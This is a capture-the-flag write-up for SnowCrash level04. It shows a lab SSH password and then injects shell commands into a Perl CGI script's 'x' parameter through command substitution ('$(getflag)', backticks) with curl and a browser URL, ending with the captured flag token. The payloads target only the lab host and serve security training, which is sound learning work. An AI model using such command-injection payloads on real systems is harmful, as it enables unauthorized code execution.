ssh level04@ip -p 4242
pwd: qi0maab88jeaj46qoumi7maus

```
level04@SnowCrash:~$ file level04.pl
    a /usr/bin/perl script, ASCII text executable
```

In Perl, CGI(Common Gateway Interface) is a protocol for executing scripts via web requests.

an interface specification that enables web servers to execute an external program

```
level04@SnowCrash:~$ /usr/bin/perl level04.pl
Content-type: text/html


```

quick google on how Sending Parameters via [cURL](http://conqueringthecommandline.com/book/curl#uid105)
?param=

```
level04@SnowCrash:~$ curl localhost:4747?x=$(ls)
level04@SnowCrash:~$ curl localhost:4747?x=$(pwd)
```
then why not pass a getflag command

```
level04@SnowCrash:~$ curl localhost:4747?x=$(getflag)
Check
curl: (6) Couldn't resolve host 'flag.Here'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'your'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host ''
curl: (6) Couldn't resolve host 'Nope'
curl: (6) Couldn't resolve host 'there'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'no'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host 'here'
curl: (6) Couldn't resolve host 'for'
curl: (6) Couldn't resolve host 'you'
curl: (6) Couldn't resolve host 'sorry.'
curl: (6) Couldn't resolve host 'Try'
curl: (6) Couldn't resolve host 'again'
```

a quick googling on how to skip Special characters in cURL
https://stackoverflow.com/questions/10060093/special-characters-like-and-in-curl-post-data


You can use \ sign 
or single quotes
`curl localhost:4747?x='$(getflag)'`

other alternative of command substitution is using the ``
```
curl localhost:4747?x='`getflag`'
curl localhost:4747?x=\`getflag\`
```
or in the browser
http://10.12.100.98:4747/?x=`getflag`

token : ne2searoevaevoem4ov4ar8ap